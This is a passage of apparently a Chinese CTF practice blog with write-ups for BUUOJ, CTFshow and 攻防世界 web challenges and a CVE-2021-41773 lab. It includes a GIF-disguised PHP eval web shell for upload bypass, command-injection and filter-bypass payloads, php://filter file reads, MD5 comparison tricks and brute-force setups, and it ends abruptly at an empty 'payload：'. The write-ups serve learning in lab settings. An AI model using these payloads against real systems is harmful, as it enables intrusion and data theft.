<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28174</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Syclover</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17d26e27951337-0f7088736cbf9a-b7a1438-144000-17d26e27952da6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>最终得到flag</p>
<h1 id="command-execution（攻防世界）"><a href="#command-execution（攻防世界）" class="headerlink" title="command_execution（攻防世界）"></a>command_execution（攻防世界）</h1><p>该题比较简单，但是注意cd ../然后再ls。这里也可以用<code>find / -name &quot;flag.txt&quot;</code>命令进行搜索，这里是猜测的文件名叫flag.txt如果不知道，那只能一个文件一个文件的找。</p>
<p>用<code>find / -name &quot;flag.txt&quot;</code>得知flag.txt在/home/flag.txt，然后用指令<code>cat /home/flag.txt</code>得到flag</p>
<h1 id="upload1（攻防世界）"><a href="#upload1（攻防世界）" class="headerlink" title="upload1（攻防世界）"></a>upload1（攻防世界）</h1><p>题目要求上传图片，gif不行，则随便上传一个图片，然后抓包更改后缀为.php，然后将代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a? <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_REQUEST[<span class="number">1</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>复制进去，然后根据上传的位置，用蚁剑连接即可找到flag</p>
<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>首先要了解php中的<a href="https://www.w3school.com.cn/php/func_string_chr.asp">chr()函数</a>、<a href="https://www.runoob.com/php/func-directory-scandir.html">scandir()函数</a>、<a href="https://www.runoob.com/php/php-var_dump-function.html">var_dump()函数</a>、<a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">file_get_contents()函数</a></p>
<p>在源码中发现了<code>calc.php?num=</code>则访问calc.php发现部分源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>别人的wp说这是禁用了许多字符，我现在还看不懂。呜呜呜</p>
<p>然后构造</p>
<p><code>? num=var_dump(scandir(chr(47)))</code></p>
<p><strong>?和num之间有一个空格</strong></p>
<p><strong>原因是：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</strong></p>
<p><img src="/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/image-20220212185644770.png" alt="image-20220212185644770"></p>
<p>我们利用chr这个函数来构造函数内的字符串参数，就不需要用单双引号，从而成功绕过正则表达式。</p>
<p>然后构造</p>
<p><code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
<p>这是/f1agg，然后即可得到flag</p>
<h1 id="CVE-2021-41773（实验室）"><a href="#CVE-2021-41773（实验室）" class="headerlink" title="CVE-2021-41773（实验室）"></a>CVE-2021-41773（实验室）</h1><p>说是一个apache2.4.49的漏洞，具体成因我也不太清楚，加cgi-bin的原因也不清楚，呜呜呜</p>
<p><img src="/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/image-20220212192414635.png" alt="image-20220212192414635"></p>
<p>这里的%2e是.的url编码，这里不能换成..  具体原因我也不太清楚，然后这里是在该位置下将内容输出到flag.txt文件中，结果为flag{This is CVE-2021-41773}</p>
<h1 id="MD5-各种比较（实验室）"><a href="#MD5-各种比较（实验室）" class="headerlink" title="MD5 各种比较（实验室）"></a>MD5 各种比较（实验室）</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./success.txt&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 1</span></span><br><span class="line"><span class="variable">$val1</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>];</span><br><span class="line"><span class="variable">$val2</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val1</span> == <span class="variable">$val2</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val1 OR val2 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5(<span class="variable">$val1</span>) != md5(<span class="variable">$val2</span>) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 1 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;step 1 ok !!!&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解释出来就是val1和val2的值不等但是md5解析相同，<strong>因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</strong>这里<a href="https://www.cnblogs.com/ainsliaea/p/15126218.html">参考</a></p>
<p>构造<code>?val1=s878926199a&amp;val2=s155964671a</code>成功过第一步</p>
<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// step 2</span></span><br><span class="line"><span class="variable">$thatfeelslike</span> = <span class="string">&quot;dcd385&quot;</span>;</span><br><span class="line"><span class="variable">$val3</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val3&#x27;</span>];</span><br><span class="line"><span class="variable">$val4</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val4&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val3</span> == <span class="variable">$val4</span> || is_array(<span class="variable">$val3</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val3 OR val4 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr(md5(<span class="variable">$val3</span>),<span class="number">0</span>,<span class="number">6</span>) !== substr(md5(<span class="variable">$val4</span>),<span class="number">0</span>,<span class="number">6</span>) || <span class="variable">$thatfeelslike</span> !== substr(md5(<span class="variable">$val3</span>),<span class="number">0</span>,<span class="number">6</span>) )&#123;</span><br><span class="line">    <span class="comment">// echo substr(md5($val3),0,5);</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 2 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;step 2 ok !!!&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>val3和val4不能相等，且val3不是数组，且val3和val4的md5加密前六位都是dcd385，我这里实在找不到。上网搜到了<a href="https://www.cnblogs.com/auzc/p/15845887.html">wp</a>，这里面提供了</p>
<p>构造<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3=23902125&amp;val4=23027101</code></p>
<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// step 3</span></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) === md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;step 3 ok !!! wuhu~~&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里是a和b的值不等，但是md5加密后却相等。因为这里是<code>===</code>不仅<strong>比较值相等还会比较值得类型是否相同</strong>0E在这里就不可用了。</p>
<p><strong>php中md5和sha1函数都无法处理数组，会返回NULL</strong><br>所以构造<code>a[]=1&amp;&amp;b[]=2</code>就可以绕过。<a href="https://blog.csdn.net/john_lain/article/details/83478023">参考</a></p>
<h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// step 4</span></span><br><span class="line">    <span class="variable">$val5</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val5&#x27;</span>];</span><br><span class="line">    <span class="variable">$val6</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val6&#x27;</span>];</span><br><span class="line">    <span class="variable">$val7</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val7&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$val5</span>) === md5(<span class="variable">$val6</span>) &amp;&amp; md5(<span class="variable">$val6</span>) === md5(<span class="variable">$val7</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tql!ddw! 记录你的名字吧!&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> =  @<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$name</span>)&gt;<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="string">&quot;./success.txt&quot;</span>,<span class="variable">$name</span>.PHP_EOL,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个不用搞了，没传值直接就ok</p>
]]></content>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题记录-3（信息收集）</title>
    <url>/2022/02/12/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-3/</url>
    <content><![CDATA[<h1 id="vim临时文件泄露（CTFshow）"><a href="#vim临时文件泄露（CTFshow）" class="headerlink" title="vim临时文件泄露（CTFshow）"></a>vim临时文件泄露（CTFshow）</h1><p>直接进入index.php.swp下载文件即可得到flag。用dirsearch扫描无结果</p>
<p>即构造<code>/index.php.swp</code>index.php使传统意义上的默认主页</p>
<span id="more"></span>

<h1 id="cookie泄露（CTFshow）"><a href="#cookie泄露（CTFshow）" class="headerlink" title="cookie泄露（CTFshow）"></a>cookie泄露（CTFshow）</h1><p>这个直接用cookie editor查看即可，也可以抓包</p>
<h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><p>js前台拦截，无法查看源码，则在url前面加上<code>view-source:</code>即可查看</p>
<h1 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h1><p>直接抓包发往repeater，然后在response中发现flag</p>
<h1 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h1><p>根据题目提示，进入robots.txt，接着根据提示进入/flagishere.txt得到flag</p>
<h1 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h1><p>.phps文件的解释</p>
<p>phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。但是，并不是所有的php文件都存在.phps后缀，不是默认带有，只会在特殊情况下存在</p>
<p>这里根据提示访问index.phps文件，得到flag</p>
<h1 id="WEB6"><a href="#WEB6" class="headerlink" title="WEB6"></a>WEB6</h1><p>访问<code>url/www.zip</code>进行下载源码，解压后即可得到flag</p>
<h1 id="WEB7"><a href="#WEB7" class="headerlink" title="WEB7"></a>WEB7</h1><p>考察git代码泄露，访问<code>url/.git/index.php</code>得到flag</p>
<h1 id="WEB8"><a href="#WEB8" class="headerlink" title="WEB8"></a>WEB8</h1><p>考察SVN泄露</p>
<p>SVN（subversion）是源代码的版本管理软件，造成SVN源代码泄露的主要原因是管理员操作不规范将SVN隐藏文件夹暴露到外网环境中</p>
<p>访问<code>url/.svn</code>获得flag</p>
<h1 id="WEB9"><a href="#WEB9" class="headerlink" title="WEB9"></a>WEB9</h1><p>考察Vim泄露，直接访问<code>url/index.php.swp</code>即可，然后打开下载的文件，即可获得flag</p>
<h1 id="WEB10"><a href="#WEB10" class="headerlink" title="WEB10"></a>WEB10</h1><p>用cookie editor查看，然后url解码即可，也可以抓包</p>
<h1 id="WEB11"><a href="#WEB11" class="headerlink" title="WEB11"></a>WEB11</h1><p>TXT记录</p>
<ul>
<li>示例：ns1.exmaple.com. IN TXT   “联系电话：XXXX”</li>
<li>解释：【domain】 IN TXT 【任意字符串】</li>
</ul>
<p>干什么用呢？</p>
<p>一般指某个主机名或域名的说明，或者联系方式，或者标注提醒等等。</p>
<p>直接检查ctfshow.com的DNS中的TXT记录（这里用<a href="https://zijian.aliyun.com/">阿里的</a>），即可获得flag。<a href="https://www.jianshu.com/p/b483300378af">其他记录</a></p>
<h1 id="WEB12"><a href="#WEB12" class="headerlink" title="WEB12"></a>WEB12</h1><p>robots.txt：记录一些目录和<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">CMS</a>版本信息</p>
<p>进入<code>url/robots.txt</code>得知有/admin/文件夹，然后<code>url/admin</code>进入，然后猜测账户为admin，密码为下面的电话号，登入得到flag</p>
<h1 id="WEB13"><a href="#WEB13" class="headerlink" title="WEB13"></a>WEB13</h1><p>拉到最下面发现document可以点击，进入后发现后台格式，还有账号和密码，登入得到flag</p>
<h1 id="WEB14"><a href="#WEB14" class="headerlink" title="WEB14"></a>WEB14</h1><p>根据提示，进入<code>url/editor</code>路径</p>
<p>然后点击flash中的文件空间，在var/www/html/nothinghere/fl000g.txt发现flag，然后进入url/nothinghere/fl000g.txt得到flag</p>
<h1 id="WEB15"><a href="#WEB15" class="headerlink" title="WEB15"></a>WEB15</h1><p>浏览页面后，发现邮箱，尝试进入url/admin。发现后台登录页面，账户时admin，点击忘记密码，然后用qq搜索刚才的邮箱qq发现地址西安，密码重置后登录获得flag</p>
<h1 id="WEB16"><a href="#WEB16" class="headerlink" title="WEB16"></a>WEB16</h1><p>题目说有探针，那么访问<code>url/tz.php</code>然后在phpinfo中搜索flag得到flag</p>
<h1 id="WEB17"><a href="#WEB17" class="headerlink" title="WEB17"></a>WEB17</h1><p>直接输入<code>url/backup.sql</code>下载备份文件，得到flag</p>
<h1 id="WEB18"><a href="#WEB18" class="headerlink" title="WEB18"></a>WEB18</h1><p>进入游戏后，查看js文件，然后发现一段Unicode加密的密文，</p>
<p>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</p>
<p>解密后：你赢了，去幺幺零点皮爱吃皮看看</p>
<p>进入url/110.php得到flag</p>
<h1 id="WEB19"><a href="#WEB19" class="headerlink" title="WEB19"></a>WEB19</h1><p><img src="/2022/02/12/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-3/image-20220214110909063.png" alt="image-20220214110909063"></p>
<p>用hackbar传参得到flag</p>
<h1 id="WEB20"><a href="#WEB20" class="headerlink" title="WEB20"></a>WEB20</h1><p>根据提示mdb文件是早期asp+access构架的数据库文件 访问<code>url/db/db.mdb</code> 下载文件通过txt打开然后搜索flag得到flag</p>
]]></content>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题记录-4（爆破）</title>
    <url>/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/</url>
    <content><![CDATA[<h1 id="WEB21"><a href="#WEB21" class="headerlink" title="WEB21"></a>WEB21</h1><p>这道题有点意思，不只是单纯的爆破，还进行了base64加密，首先下载给的字典。然后用字典进行爆破，爆破时要用custom iterator（自定义迭代器），然后通过base64解码得知格式为 <code>用户名:密码</code>攻击类型为Sniper</p>
<p>设置如下</p>
<span id="more"></span>

<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175309858.png" alt="image-20220217175309858"></p>
<p>这里的admin只是猜测，没想到真能搞出来</p>
<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175341802.png" alt="image-20220217175341802"></p>
<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175430654.png" alt="image-20220217175430654"></p>
<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217180350198.png" alt="image-20220217180350198"></p>
<p>最终得到flag</p>
<h1 id="WEB22"><a href="#WEB22" class="headerlink" title="WEB22"></a>WEB22</h1><p>爆破子域名，这个还真不会，但是这个<a href="http://z.zcjun.com/?http=baidu.com">在线爆破子域名</a>可还行</p>
<h1 id="WEB23"><a href="#WEB23" class="headerlink" title="WEB23"></a>WEB23</h1><p>呜呜呜，这个也不会，等着以后学了php再回来搞，码子先放这了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];    </span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$token</span>); </span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123; </span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="WEB24"><a href="#WEB24" class="headerlink" title="WEB24"></a>WEB24</h1><p>这里首先要认识一个函数<a href="https://www.w3school.com.cn/php/func_math_mt_rand.asp">mt_rand() 函数</a>，代码可以<a href="https://c.runoob.com/compile/1/">在线上执行</a></p>
<p>首先要知道题目中的mt_srand(372619038)是多少</p>
<p>所以我们运行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span>(mt_rand());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到1155388967所以令r=1155388967，得到flag</p>
<h1 id="WEB25"><a href="#WEB25" class="headerlink" title="WEB25"></a>WEB25</h1><p>有点复杂呜呜呜，留给“明天”吧</p>
<h1 id="WEB26"><a href="#WEB26" class="headerlink" title="WEB26"></a>WEB26</h1><p>查看源码发现js，直接进入代码中的checkdb.php，然后直接post提交（原理不太清楚）</p>
<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217200641171.png" alt="image-20220217200641171"></p>
<p>得到flag</p>
<h1 id="WEB27"><a href="#WEB27" class="headerlink" title="WEB27"></a>WEB27</h1><p>这里是爆破身份证号中的生日，设置如下，如果线程太多的话，很可能出现503报错，导致爆破结果不准确</p>
<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217203239020.png" alt="image-20220217203239020"></p>
<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217204616803.png" alt="image-20220217204616803"></p>
<p>得出结果后，Unicode解码后用学号登入，得到flag</p>
<h1 id="WEB28"><a href="#WEB28" class="headerlink" title="WEB28"></a>WEB28</h1><p>看到url中诡异的0/1则用集束炸弹爆破这两个地方，最后得到flag</p>
<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217205359730.png" alt="image-20220217205359730"></p>
]]></content>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题记录-5（命令执行）</title>
    <url>/2022/02/23/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-5/</url>
    <content><![CDATA[<h1 id="WEB29"><a href="#WEB29" class="headerlink" title="WEB29"></a>WEB29</h1><p>首先认识几个函数<a href="https://www.runoob.com/php/php-preg_match.html">preg_match</a>、<a href="https://www.w3school.com.cn/php/func_misc_eval.asp">eval</a>、<a href="https://www.php.net/manual/zh/function.system.php">system</a></p>
<p>payload1：/?c=system(“ls”);   发现flag.php文件，由于c中不能包含flag字符串，所以用通配符绕过</p>
<p>payload2：/?c=system(“cat fla*”);  然后查看源码得到flag</p>
<span id="more"></span>

<h1 id="WEB30"><a href="#WEB30" class="headerlink" title="WEB30"></a>WEB30</h1><p>这里过滤了system，所以用echo(该方法同样适用于WEB29)</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=echo `cat fla*`;</span><br></pre></td></tr></table></figure>

<h1 id="WEB31"><a href="#WEB31" class="headerlink" title="WEB31"></a>WEB31</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了system，这里使用echo。flag,php过滤继续用通配符绕过。空格用%09绕过，cat被过滤了换成tac。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=echo%09`tac%09fla*`;</span><br></pre></td></tr></table></figure>

<h1 id="WEB32"><a href="#WEB32" class="headerlink" title="WEB32"></a>WEB32</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了system,echo,这里可以使用passthru，但是这次还过滤了括号，所以passthru也没有办法用，这里使用文件包含，通过php://filter协议进行读取文件。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=$shl=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>或者payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>解码就到flag</p>
<h1 id="WEB33"><a href="#WEB33" class="headerlink" title="WEB33"></a>WEB33</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了和WEB32一样的东西，但是用WEB32的payload却不行，目前不知道为啥，WEB32也不能用WEB33的payload。</p>
<p>payload：</p>
